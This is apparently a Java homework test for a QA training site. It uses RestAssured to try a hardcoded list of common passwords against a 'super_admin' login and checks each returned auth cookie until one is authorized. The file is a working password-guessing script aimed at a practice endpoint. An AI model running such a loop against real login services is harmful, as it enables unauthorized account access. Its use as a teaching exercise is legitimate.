import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.HashMap;
import java.util.Map;

public class Homework_9 {

    @Test
    public void HomeworkTest() {
        String[] passwords = {
                "password", "123456", "12345678", "qwerty", "abc123", "monkey", "1234567",
                "letmein", "trustno1", "dragon", "baseball", "111111", "iloveyou", "master",
                "sunshine", "ashley", "bailey", "passw0rd", "shadow", "123123", "654321",
                "superman", "qazwsx", "michael", "Football", "welcome", "jesus", "ninja",
                "mustang", "password1", "123456789", "adobe123", "admin", "1234567890", "photoshop",
                "1234", "12345", "princess", "azerty", "000000", "access", "696969",
                "batman", "1qaz2wsx", "login", "qwertyuiop", "solo", "starwars", "121212",
                "flower", "hottie", "loveme", "zaq1zaq1", "hello", "freedom", "whatever",
                "666666", "654321", "!@#$%^&*", "charlie", "aa123456", "donald", "qwerty123",
                "1q2w3e4r", "555555", "lovely", "7777777", "888888", "123qwe"};

        for (int i = 0; i < passwords.length; i++) {

            Map<String, String> credentials = new HashMap<>();
            credentials.put("login", "super_admin");
            credentials.put("password", passwords[i]);

            Response responseToGetCookie = RestAssured
                    .given()
                    .body(credentials)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();

            String auth_cookie = responseToGetCookie.getCookie("auth_cookie");

            Map<String, String> cookies = new HashMap<>();
            cookies.put("auth_cookie", auth_cookie);

            Response responseToCheckCookie = RestAssured
                    .given()
                    .body(credentials)
                    .cookies(cookies)
                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();

            System.out.println("Now checking: " + credentials.get("password"));

            if (!(responseToCheckCookie.asString().contains("You are NOT authorized"))) {
                System.out.println(responseToCheckCookie.asString() + "!\nCorrect password for " + credentials.get("login") + " is: " + credentials.get("password"));
                break;
            }
        }
    }
}